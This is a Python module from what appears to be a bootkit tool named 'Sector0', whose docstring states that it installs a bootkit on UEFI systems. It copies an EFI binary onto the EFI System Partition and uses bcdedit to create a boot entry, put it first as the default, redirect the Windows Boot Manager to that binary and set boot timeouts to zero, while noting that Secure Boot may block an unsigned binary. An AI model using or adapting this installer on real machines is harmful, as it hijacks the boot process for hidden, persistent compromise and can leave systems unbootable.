"""
Sector0 - UEFI Boot Installer
================================
Handles EFI binary installation and BCD configuration.
"""

import os
import re
import subprocess
from typing import Optional, Tuple

from .utils import log, run_cmd, run_cmd_safe
from .disk import DiskManager


class UEFIBootInstaller:
    """Installs bootkit on UEFI systems."""
    
    def __init__(self, disk_manager: DiskManager, config: dict):
        """
        Initialize UEFI installer.
        
        Args:
            disk_manager: DiskManager instance
            config: Configuration dictionary
        """
        self.disk = disk_manager
        self.config = config
        self.mounted_drive = None
        self.created_guid = None
        
    def install(self) -> bool:
        """
        Perform full UEFI bootkit installation.
        
        Returns:
            True on success
        """
        binary_path = self.config.get("binary_path")
        
        if not binary_path or not os.path.exists(binary_path):
            log(f"EFI binary not found: {binary_path}", "ERROR")
            return False
        
        # Check Secure Boot status
        if self.disk.check_secure_boot():
            log("WARNING: Secure Boot is ENABLED - unsigned binary may not boot", "WARN")
        
        try:
            # Mount ESP
            volume = self.disk.find_system_volume(is_uefi=True)
            if not volume:
                log("EFI System Partition not found", "ERROR")
                return False
            
            self.mounted_drive = self.disk.mount_volume(volume)
            log(f"Mounted ESP at {self.mounted_drive}", "INFO")
            
            # Copy EFI binary
            dest_path = self._copy_efi_binary(binary_path)
            if not dest_path:
                return False
            
            # Configure BCD
            self._configure_bcd(dest_path)
            
            log("UEFI installation completed", "INFO")
            return True
            
        except Exception as e:
            log(f"Installation failed: {e}", "ERROR")
            return False
            
        finally:
            if self.mounted_drive:
                self.disk.unmount_volume(self.mounted_drive)
    
    def _copy_efi_binary(self, binary_path: str) -> Optional[str]:
        """
        Copy EFI binary to ESP.
        
        Returns:
            Destination path on success
        """
        efi_path = self.config.get("efi_path", r"\EFI\BOOT")
        binary_name = self.config.get("binary", "BOOTX64.efi")
        
        # Create directory structure
        base_dir = os.path.join(self.mounted_drive, efi_path.strip('\\'))
        os.makedirs(base_dir, exist_ok=True)
        
        dest_path = os.path.join(base_dir, binary_name)
        
        # Copy binary
        result = subprocess.run(
            f'copy /Y "{binary_path}" "{dest_path}"',
            shell=True,
            capture_output=True
        )
        
        if os.path.exists(dest_path) and os.path.getsize(dest_path) > 0:
            log(f"EFI binary copied to {dest_path}", "INFO")
            return dest_path
        else:
            log("Failed to copy EFI binary", "ERROR")
            return None
    
    def _configure_bcd(self, efi_path: str):
        """Configure Windows Boot Manager to use our binary."""
        boot_name = self.config.get("boot_name", "Sector0")
        efi_relative = self.config.get("efi_path", r"\EFI\BOOT")
        binary_name = self.config.get("binary", "BOOTX64.efi")
        
        # Get partition device string
        drive = os.path.splitdrive(self.mounted_drive)[0]
        partition_device = f"partition={drive}"
        bcd_path = os.path.join(efi_relative, binary_name).replace("/", "\\")
        if not bcd_path.startswith("\\"):
            bcd_path = "\\" + bcd_path
        
        # Create boot entry
        success, stdout, stderr, _ = run_cmd_safe([
            "bcdedit", "/create", "/d", boot_name, "/application", "bootapp"
        ])
        
        if success:
            # Extract GUID
            guid_match = re.search(
                r'\{[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\}',
                stdout
            )
            
            if guid_match:
                self.created_guid = guid_match.group(0)
                log(f"Created boot entry: {self.created_guid}", "INFO")
                
                # Set device and path
                run_cmd_safe(["bcdedit", "/set", self.created_guid, "device", partition_device])
                run_cmd_safe(["bcdedit", "/set", self.created_guid, "path", bcd_path])
                
                # Add to boot order
                run_cmd_safe([
                    "bcdedit", "/set", "{fwbootmgr}", 
                    "displayorder", self.created_guid, "/addfirst"
                ])
                
                # Set as default
                run_cmd_safe(["bcdedit", "/default", self.created_guid])
        
        # Force bootmgr override
        log("Overriding Windows Boot Manager...", "INFO")
        
        # Backup current settings
        success, bootmgr_info, _, _ = run_cmd_safe(["bcdedit", "/enum", "{bootmgr}"])
        if success:
            log(f"Original bootmgr config backed up to log", "DEBUG")
        
        # Override bootmgr
        run_cmd_safe(["bcdedit", "/set", "{bootmgr}", "device", partition_device])
        run_cmd_safe(["bcdedit", "/set", "{bootmgr}", "path", bcd_path])
        
        # Set zero timeout
        run_cmd_safe(["bcdedit", "/timeout", "0"])
        run_cmd_safe(["bcdedit", "/set", "{fwbootmgr}", "timeout", "0"])
        
        log("BCD configured for instant boot", "INFO")
